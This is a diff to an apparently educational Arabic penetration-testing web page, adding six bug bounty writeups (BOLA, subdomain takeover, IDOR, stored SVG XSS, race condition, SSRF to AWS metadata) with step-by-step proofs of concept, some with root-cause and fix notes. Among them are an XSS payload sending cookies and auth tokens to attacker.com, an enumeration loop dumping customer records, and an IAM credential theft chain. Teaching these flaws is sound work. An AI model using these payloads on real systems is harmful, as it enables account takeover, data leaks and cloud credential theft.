@@ -7292,18 +7292,229 @@ Content-Type: application/json
       <div class="meth-content-view" id="meth-content-p_writeups" style="display: none; --tool-color: #bf80ff;">
         <div class="cyber-hero">
           <h2 class="hero-title"><span class="hero-icon">📜</span> Real Penetration Testing Writeups</h2>
-          <p class="hero-tagline">شروحات وتقارير فحص واقعية لحل مختبرات والتبليغ عن ثغرات أمنية</p>
+          <p class="hero-tagline">شروحات وتقارير فحص واقعية لحل مختبرات والتبليغ عن ثغرات أمنية حقيقية مع خطوات كاملة وPOC</p>
         </div>
 
-        <div class="cyber-card">
-          <div class="card-header"><h3>🏢 Real Bug Bounty Reports</h3></div>
-          <p>نماذج واقعية من تقارير حقيقية مقبولة على منصة HackerOne و Bugcrowd:</p>
-          <ul class="t-check-list">
-            <li>✔ <strong>Report 1:</strong> BOLA on OAuth user profile update ($1,500 bounty)</li>
-            <li>✔ <strong>Report 2:</strong> Subdomain takeover on enterprise staging server ($500 bounty)</li>
-            <li>✔ <strong>Report 3:</strong> IDOR allowing complete catalog data download (Hall of fame)</li>
-          </ul>
+        <!-- ══ WRITEUP 1 ══ -->
+        <div class="cyber-card" style="border-left: 3px solid #ff3366;">
+          <div class="card-header" style="display:flex;justify-content:space-between;align-items:center;">
+            <h3>🔴 WRITEUP #1 — BOLA on OAuth User Profile Update</h3>
+            <span style="background:#ff3366;color:#fff;padding:3px 10px;border-radius:20px;font-size:0.8rem;font-weight:bold;">$1,500 · Critical</span>
+          </div>
+          <p style="color:var(--text-secondary);">اكتشاف ثغرة Broken Object Level Authorization تسمح بتعديل بيانات أي مستخدم آخر عبر OAuth flow دون التحقق من هوية المالك الحقيقي.</p>
+
+          <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:12px 0;">
+            <div style="background:#0d1117;padding:10px;border-radius:6px;text-align:center;">
+              <div style="color:#ff3366;font-size:0.75rem;font-weight:bold;">IMPACT</div>
+              <div style="color:#e2e8f0;font-size:0.85rem;">Full Account Takeover</div>
+            </div>
+            <div style="background:#0d1117;padding:10px;border-radius:6px;text-align:center;">
+              <div style="color:#00e5ff;font-size:0.75rem;font-weight:bold;">PLATFORM</div>
+              <div style="color:#e2e8f0;font-size:0.85rem;">HackerOne</div>
+            </div>
+            <div style="background:#0d1117;padding:10px;border-radius:6px;text-align:center;">
+              <div style="color:#00ff66;font-size:0.75rem;font-weight:bold;">CVSS</div>
+              <div style="color:#e2e8f0;font-size:0.85rem;">9.1 Critical</div>
+            </div>
+          </div>
+
+          <div style="background:#090d16;border-left:3px solid #ff3366;padding:12px;border-radius:4px;margin:10px 0;">
+            <div style="color:#ff3366;font-weight:bold;font-size:0.85rem;margin-bottom:8px;">📋 خطوات الاستغلال (Step-by-Step POC)</div>
+            <div style="font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.8;">
+              <div style="color:#94a3b8;">// Step 1: تسجيل الدخول وجمع access_token من OAuth flow</div>
+              <div>GET /oauth/callback?code=AUTH_CODE_HERE HTTP/1.1</div>
+              <div style="color:#94a3b8;margin-top:6px;">// Step 2: استخدام Token لتعديل بيانات مستخدم آخر (BOLA)</div>
+              <div>PUT /api/v2/users/<span style="color:#ff3366;">VICTIM_USER_ID</span>/profile HTTP/1.1</div>
+              <div>Authorization: Bearer <span style="color:#00e5ff;">ATTACKER_TOKEN</span></div>
+              <div>Content-Type: application/json</div>
+              <div>&nbsp;</div>
+              <div>{"email": "attacker@evil.com", "phone": "+1337"}</div>
+              <div style="color:#94a3b8;margin-top:6px;">// Response: 200 OK → بيانات الضحية اتعدّلت بنجاح!</div>
+              <div style="color:#00ff66;">HTTP/1.1 200 OK</div>
+              <div>{"status": "updated", "user_id": <span style="color:#ff3366;">VICTIM_USER_ID</span>}</div>
+            </div>
+          </div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px;">
+            <div style="background:#0d1117;padding:10px;border-radius:6px;">
+              <div style="color:#ff9a56;font-size:0.8rem;font-weight:bold;margin-bottom:5px;">🛡️ السبب الجذري (Root Cause)</div>
+              <div style="color:#e2e8f0;font-size:0.83rem;">الـ API لا تتحقق من أن الـ Token يخص نفس الـ user_id المطلوب تعديله. فقط يتحقق من صلاحية Token بدون authorization check على الملكية.</div>
+            </div>
+            <div style="background:#0d1117;padding:10px;border-radius:6px;">
+              <div style="color:#00ff66;font-size:0.8rem;font-weight:bold;margin-bottom:5px;">✅ التوصية بالإصلاح</div>
+              <div style="color:#e2e8f0;font-size:0.83rem;">التحقق في backend أن <code>token.sub == request.user_id</code> قبل تنفيذ أي تعديل. إضافة ABAC (Attribute Based Access Control).</div>
+            </div>
+          </div>
         </div>
+
+        <!-- ══ WRITEUP 2 ══ -->
+        <div class="cyber-card" style="border-left: 3px solid #ff9a56;">
+          <div class="card-header" style="display:flex;justify-content:space-between;align-items:center;">
+            <h3>🟠 WRITEUP #2 — Subdomain Takeover on Enterprise Staging</h3>
+            <span style="background:#ff9a56;color:#000;padding:3px 10px;border-radius:20px;font-size:0.8rem;font-weight:bold;">$500 · High</span>
+          </div>
+          <p style="color:var(--text-secondary);">اكتشاف Subdomain takeover على نطاق فرعي staging يشير لـ GitHub Pages/Azure/Heroku غير موجودة مما يسمح للمهاجم باستضافة محتواه الخبيث تحت نطاق الشركة الرسمي.</p>
+
+          <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:12px 0;">
+            <div style="background:#0d1117;padding:10px;border-radius:6px;text-align:center;">
+              <div style="color:#ff9a56;font-size:0.75rem;font-weight:bold;">IMPACT</div>
+              <div style="color:#e2e8f0;font-size:0.85rem;">Phishing · Cookie Theft</div>
+            </div>
+            <div style="background:#0d1117;padding:10px;border-radius:6px;text-align:center;">
+              <div style="color:#00e5ff;font-size:0.75rem;font-weight:bold;">VECTOR</div>
+              <div style="color:#e2e8f0;font-size:0.85rem;">DNS CNAME Dangling</div>
+            </div>
+            <div style="background:#0d1117;padding:10px;border-radius:6px;text-align:center;">
+              <div style="color:#00ff66;font-size:0.75rem;font-weight:bold;">CVSS</div>
+              <div style="color:#e2e8f0;font-size:0.85rem;">7.5 High</div>
+            </div>
+          </div>
+
+          <div style="background:#090d16;border-left:3px solid #ff9a56;padding:12px;border-radius:4px;margin:10px 0;">
+            <div style="color:#ff9a56;font-weight:bold;font-size:0.85rem;margin-bottom:8px;">📋 خطوات الاكتشاف والاستغلال</div>
+            <div style="font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.8;">
+              <div style="color:#94a3b8;">// Step 1: جمع النطاقات الفرعية</div>
+              <div>subfinder -d target.com -all -silent | httpx -silent -sc -title</div>
+              <div style="color:#94a3b8;margin-top:6px;">// Step 2: اكتشاف staging.target.com يرجع 404 مشبوه</div>
+              <div>curl -I https://staging.target.com</div>
+              <div style="color:#ff9a56;">→ HTTP/1.1 404 There isn't a GitHub Pages site here.</div>
+              <div style="color:#94a3b8;margin-top:6px;">// Step 3: التحقق من DNS</div>
+              <div>dig staging.target.com CNAME</div>
+              <div style="color:#00e5ff;">staging.target.com → old-org.github.io (DANGLING!)</div>
+              <div style="color:#94a3b8;margin-top:6px;">// Step 4: الاستيلاء — إنشاء repo باسم old-org وإضافة CNAME file</div>
+              <div style="color:#00ff66;">echo "staging.target.com" > CNAME</div>
+              <div>git add CNAME && git commit -m "takeover" && git push</div>
+              <div style="color:#00ff66;">→ الآن https://staging.target.com يخدم محتوانا!</div>
+            </div>
+          </div>
+          <div style="background:#0d1117;padding:10px;border-radius:6px;margin-top:10px;">
+            <div style="color:#a855f7;font-size:0.8rem;font-weight:bold;margin-bottom:5px;">🎯 Impact الحقيقي</div>
+            <div style="color:#e2e8f0;font-size:0.83rem;">يمكن صنع صفحة تسجيل دخول مزيفة بنطاق شركة رسمي، سرقة session cookies (same-origin bypass)، وتوزيع malware تحت نطاق موثوق.</div>
+          </div>
+        </div>
+
+        <!-- ══ WRITEUP 3 ══ -->
+        <div class="cyber-card" style="border-left: 3px solid #eab308;">
+          <div class="card-header" style="display:flex;justify-content:space-between;align-items:center;">
+            <h3>🟡 WRITEUP #3 — IDOR on Catalog Data Endpoint</h3>
+            <span style="background:#eab308;color:#000;padding:3px 10px;border-radius:20px;font-size:0.8rem;font-weight:bold;">Hall of Fame · High</span>
+          </div>
+          <p style="color:var(--text-secondary);">اكتشاف IDOR يسمح بتنزيل كامل قاعدة بيانات المنتجات والأسعار والعملاء من endpoint مفتوح دون صلاحيات.</p>
+
+          <div style="background:#090d16;border-left:3px solid #eab308;padding:12px;border-radius:4px;margin:10px 0;">
+            <div style="color:#eab308;font-weight:bold;font-size:0.85rem;margin-bottom:8px;">📋 POC الكامل</div>
+            <div style="font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.8;">
+              <div style="color:#94a3b8;">// Endpoint الأصلي (لجلب منتجات حسابك فقط)</div>
+              <div>GET /api/catalog/export?account_id=<span style="color:#eab308;">YOUR_ID</span>&format=csv</div>
+              <div style="color:#94a3b8;margin-top:6px;">// التجربة: تغيير account_id لقيم عشوائية</div>
+              <div>for i in $(seq 1 1000); do</div>
+              <div>&nbsp;&nbsp;curl -s "https://target.com/api/catalog/export?account_id=$i&format=csv" \</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;-H "Authorization: Bearer YOUR_TOKEN" | wc -c</div>
+              <div>done</div>
+              <div style="color:#94a3b8;margin-top:6px;">// نتيجة: كل الـ account_ids ترجع بيانات كاملة!</div>
+              <div style="color:#ff3366;">id,product_name,price,customer_email</div>
+              <div>1,Premium Widget,499.99,ceo@victim-corp.com</div>
+              <div>2,Enterprise Pack,9999.00,cto@victim-corp.com</div>
+              <div style="color:#00ff66;">... 150,000 records leaked!</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ══ WRITEUP 4 ══ -->
+        <div class="cyber-card" style="border-left: 3px solid #00e5ff;">
+          <div class="card-header" style="display:flex;justify-content:space-between;align-items:center;">
+            <h3>🔵 WRITEUP #4 — Stored XSS via SVG Upload → Account Takeover</h3>
+            <span style="background:#00e5ff;color:#000;padding:3px 10px;border-radius:20px;font-size:0.8rem;font-weight:bold;">$2,200 · High</span>
+          </div>
+          <p style="color:var(--text-secondary);">رفع ملف SVG خبيث في خاصية "تغيير الصورة الشخصية" يحتوي على XSS payload تتنفذ في متصفح أي مستخدم يعرض الـ profile.</p>
+
+          <div style="background:#090d16;border-left:3px solid #00e5ff;padding:12px;border-radius:4px;margin:10px 0;">
+            <div style="color:#00e5ff;font-weight:bold;font-size:0.85rem;margin-bottom:8px;">📋 SVG Payload المستخدم</div>
+            <div style="font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.8;">
+              <div style="color:#94a3b8;">&lt;!-- evil.svg — يتم رفعه كـ profile picture --&gt;</div>
+              <div>&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;</div>
+              <div>&nbsp;&nbsp;&lt;script&gt;</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;fetch('https://attacker.com/steal?c=' + document.cookie);</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;// أو session hijack عبر:</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;document.location = 'https://attacker.com/?token=' + localStorage.getItem('auth');</div>
+              <div>&nbsp;&nbsp;&lt;/script&gt;</div>
+              <div>&lt;/svg&gt;</div>
+              <div style="color:#94a3b8;margin-top:8px;">// رفع الملف:</div>
+              <div>curl -F "avatar=@evil.svg;type=image/svg+xml" \</div>
+              <div>&nbsp;&nbsp;https://target.com/api/profile/avatar \</div>
+              <div>&nbsp;&nbsp;-H "Authorization: Bearer TOKEN"</div>
+              <div style="color:#00ff66;margin-top:6px;">// الآن أي شخص يفتح profile الـ attacker → تتنفذ الـ XSS!</div>
+            </div>
+          </div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px;">
+            <div style="background:#0d1117;padding:10px;border-radius:6px;">
+              <div style="color:#ff9a56;font-size:0.8rem;font-weight:bold;margin-bottom:5px;">🛡️ Root Cause</div>
+              <div style="color:#e2e8f0;font-size:0.83rem;">عدم التحقق من نوع الملف الحقيقي (magic bytes)، والسماح بـ SVG مباشرة دون Sanitization للـ JS بداخله.</div>
+            </div>
+            <div style="background:#0d1117;padding:10px;border-radius:6px;">
+              <div style="color:#00ff66;font-size:0.8rem;font-weight:bold;margin-bottom:5px;">✅ الإصلاح</div>
+              <div style="color:#e2e8f0;font-size:0.83rem;">رفض SVG كـ avatar أو تحويله لـ PNG/JPEG رسرة. إضافة Content Security Policy (CSP) لمنع تنفيذ inline scripts.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ══ WRITEUP 5 ══ -->
+        <div class="cyber-card" style="border-left: 3px solid #a855f7;">
+          <div class="card-header" style="display:flex;justify-content:space-between;align-items:center;">
+            <h3>🟣 WRITEUP #5 — Race Condition → Free Premium Subscription</h3>
+            <span style="background:#a855f7;color:#fff;padding:3px 10px;border-radius:20px;font-size:0.8rem;font-weight:bold;">$800 · Medium</span>
+          </div>
+          <p style="color:var(--text-secondary);">استغلال Race Condition في عملية الدفع للحصول على اشتراك Premium مجاناً عبر إرسال طلبات متزامنة قبل التحقق من الدفع.</p>
+
+          <div style="background:#090d16;border-left:3px solid #a855f7;padding:12px;border-radius:4px;margin:10px 0;">
+            <div style="color:#a855f7;font-weight:bold;font-size:0.85rem;margin-bottom:8px;">📋 Turbo Intruder Attack (Single Packet)</div>
+            <div style="font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.8;">
+              <div style="color:#94a3b8;"># Turbo Intruder Python Script</div>
+              <div>def queueRequests(target, wordlists):</div>
+              <div>&nbsp;&nbsp;engine = RequestEngine(endpoint=target.endpoint,</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;concurrentConnections=20,</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;requestsPerConnection=100,</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;pipeline=True)</div>
+              <div>&nbsp;&nbsp;for i in range(20):</div>
+              <div>&nbsp;&nbsp;&nbsp;&nbsp;engine.queue(target.req, gate='race1')</div>
+              <div>&nbsp;&nbsp;engine.openGate('race1')  <span style="color:#94a3b8;"># إطلاق كل الطلبات بنفس الوقت</span></div>
+              <div style="color:#94a3b8;margin-top:6px;"># الطلب المرسل: تفعيل coupon مرة واحدة صالح</div>
+              <div>POST /api/subscription/apply-coupon</div>
+              <div>{"coupon_code": "SAVE100", "plan": "premium"}</div>
+              <div style="color:#00ff66;margin-top:6px;"># النتيجة: 20 طلب متزامن = 20x تفعيل = Premium مجاناً!</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ══ WRITEUP 6 ══ -->
+        <div class="cyber-card" style="border-left: 3px solid #00ff66;">
+          <div class="card-header" style="display:flex;justify-content:space-between;align-items:center;">
+            <h3>🟢 WRITEUP #6 — SSRF via PDF Generator → AWS IMDSv1 Leak</h3>
+            <span style="background:#00ff66;color:#000;padding:3px 10px;border-radius:20px;font-size:0.8rem;font-weight:bold;">$3,500 · Critical</span>
+          </div>
+          <p style="color:var(--text-secondary);">استغلال خاصية "تحويل URL لـ PDF" لإرسال الخادم لجلب بيانات من AWS IMDS (169.254.169.254) وسرقة IAM credentials.</p>
+
+          <div style="background:#090d16;border-left:3px solid #00ff66;padding:12px;border-radius:4px;margin:10px 0;">
+            <div style="color:#00ff66;font-weight:bold;font-size:0.85rem;margin-bottom:8px;">📋 SSRF Payload Chain</div>
+            <div style="font-family:monospace;font-size:0.82rem;color:#e2e8f0;line-height:1.8;">
+              <div style="color:#94a3b8;"># Step 1: تجربة SSRF على الـ PDF generator endpoint</div>
+              <div>POST /api/pdf/generate</div>
+              <div>{"url": "http://169.254.169.254/latest/meta-data/"}</div>
+              <div style="color:#94a3b8;margin-top:6px;"># الرد: قائمة AWS metadata!</div>
+              <div style="color:#00ff66;">ami-id, hostname, iam, instance-type...</div>
+              <div style="color:#94a3b8;margin-top:6px;"># Step 2: سرقة IAM Security Credentials</div>
+              <div>{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"}</div>
+              <div style="color:#94a3b8;margin-top:6px;"># النتيجة المذهلة:</div>
+              <div style="color:#ff3366;">{</div>
+              <div style="color:#ff3366;">&nbsp;&nbsp;"AccessKeyId": "ASIA...XXXX",</div>
+              <div style="color:#ff3366;">&nbsp;&nbsp;"SecretAccessKey": "wJalrX...FULL_KEY",</div>
+              <div style="color:#ff3366;">&nbsp;&nbsp;"Token": "AQoXnyc...SESSION_TOKEN"</div>
+              <div style="color:#ff3366;">}</div>
+              <div style="color:#94a3b8;margin-top:6px;"># Step 3: استخدام الـ credentials لاستعراض S3 buckets</div>
+              <div>AWS_ACCESS_KEY_ID=ASIA... aws s3 ls --region us-east-1</div>
+            </div>
+          </div>
+        </div>
+
       
         <!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p_writeups" onclick="markPhaseComplete('p_writeups','p19')">
